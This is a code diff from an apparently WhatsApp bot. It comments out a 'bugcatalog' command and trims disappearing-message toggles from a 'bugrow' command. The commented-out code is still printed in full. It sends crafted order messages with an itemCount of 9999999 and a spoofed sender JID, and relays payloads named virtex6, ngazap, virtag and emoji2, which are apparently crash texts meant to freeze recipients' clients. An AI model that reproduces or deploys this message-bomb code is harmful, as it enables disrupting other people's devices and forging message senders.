@@ -6851,7 +6851,6 @@ case 'buglink':
 break
 case 'bugrow':
 if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
-Nexus.toggleDisappearingMessages(from, 0)
  listMsg = {
  buttonText: 'LIST MENU',
  footerText: `${emoji2(prefix)}`,
@@ -6869,34 +6868,33 @@ Nexus.toggleDisappearingMessages(from, 0)
  listType: 1
 }
 Nexus.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
-Nexus.toggleDisappearingMessages(from, 0)
 break
-case 'bugcatalog':
-if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
- babi = (teks) => {
-             res = Nexus.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
-  key: {
-   participant: '919999999@s.whatsapp.net' // Fake sender Jid
-  },
-  message: {
-   orderMessage: {
-    itemCount: 9999999, // Bug
-    status: 1,
-    surface: 1,
-    message: `${virtex6(prefix)}`,
-    orderTitle: `${emoji2(prefix)}`, // Idk what this does
-    sellerJid: '919999999@s.whatsapp.net' // Seller
-   }
-  }
- }
-})
-             Nexus.relayWAMessage(res)
-        }
-        babi(`${ngazap(prefix)}`)
-        babi(`${virtag(prefix)}`)
-        babi(`${virtex6(prefix)}`)
-        babi(`${emoji2(prefix)}`)
-break
+// case 'bugcatalog':
+// if (!isCreator && !m.key.fromMe) return reply('Only owner can use this feature')
+//  babi = (teks) => {
+//              res = Nexus.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
+//   key: {
+//    participant: '919999999@s.whatsapp.net' // Fake sender Jid
+//   },
+//   message: {
+//    orderMessage: {
+//     itemCount: 9999999, // Bug
+//     status: 1,
+//     surface: 1,
+//     message: `${virtex6(prefix)}`,
+//     orderTitle: `${emoji2(prefix)}`, // Idk what this does
+//     sellerJid: '919999999@s.whatsapp.net' // Seller
+//    }
+//   }
+//  }
+// })
+//              Nexus.relayWAMessage(res)
+//         }
+//         babi(`${ngazap(prefix)}`)
+//         babi(`${virtag(prefix)}`)
+//         babi(`${virtex6(prefix)}`)
+//         babi(`${emoji2(prefix)}`)
+// break
 
 default:
 
